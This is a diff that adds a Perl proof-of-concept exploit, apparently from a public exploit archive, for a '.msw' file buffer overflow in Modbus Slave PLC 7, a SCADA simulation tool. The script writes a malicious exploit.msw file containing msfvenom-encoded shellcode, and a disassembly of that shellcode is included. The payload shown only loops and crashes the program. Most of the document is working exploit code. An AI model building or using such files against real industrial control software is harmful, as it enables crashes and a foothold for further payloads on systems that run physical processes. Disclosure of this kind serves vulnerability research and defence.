@@ -1,0 +1,43 @@
+# Exploit Title: Modbus Slave PLC 7 - '.msw' Buffer Overflow (PoC)
+# Author: Kağan Çapar
+# Discovery Date: 2018-10-27
+# Software Link: https://www.modbustools.com/download/ModbusSlaveSetup32Bit.exe
+# Vendor Homepage : https://www.modbustools.com
+# Tested Version: 7
+# Tested on OS: Windows XP SP3 *ENG
+# other version should be affected
+# About software : Modbus Slave is for simulating up to 32 slave devices in 32 windows!. 
+# Speed up your PLC programming with this simulating tools.  Used for SCADA systems.
+# Modbus is a serial communications protocol originally published by Schneider Electric
+# Steps to Reproduce: Run the perl exploit script, it will create a new
+# file with the name "exploit.msw" and Drag on to "mbslave.exe"
+# you will see a loop and crash on software
+# Greetz : cwd-onkan-badko-key-akkus
+
+# ! /usr/bin/perl
+
+# Dump of assembler code for function loop:
+# 0x0000555555558030 <+0>:	mov    $0x1e3b563c,%ebx
+# 0x0000555555558035 <+5>:	fld    %st(4)
+# 0x0000555555558037 <+7>:	fnstenv -0xc(%rsp)
+# 0x000055555555803b <+11>:	pop    %rax
+# 0x000055555555803c <+12>:	sub    %ecx,%ecx
+# 0x000055555555803e <+14>:	mov    $0x1,%cl
+# 0x0000555555558040 <+16>:	xor    %ebx,0x14(%rax)
+# 0x0000555555558043 <+19>:	add    $0x4,%eax
+# 0x0000555555558046 <+22>:	add    0x10(%rax),%ebx
+# 0x0000555555558049 <+25>:	fisubs 0xe0d0(%rbx)
+
+# msfvenom -p generic/tight_loop --platform windows_86 -f perl -e x86/shikata_ga_nai
+# print /x &loop
+# $1 = 0x555555558030
+
+open(code, ">exploit.msw");
+binmode(code);
+$loop = 
+"\xbb\x3c\x56\x3b\x1e\xd9\xc4\xd9\x74\x24\xf4\x58\x2b\xc9" .
+"\xb1\x01\x31\x58\x14\x83\xc0\x04\x03\x58\x10\xde\xa3\xd0" .
+"\xe0";
+
+print code $loop;
+close(code);
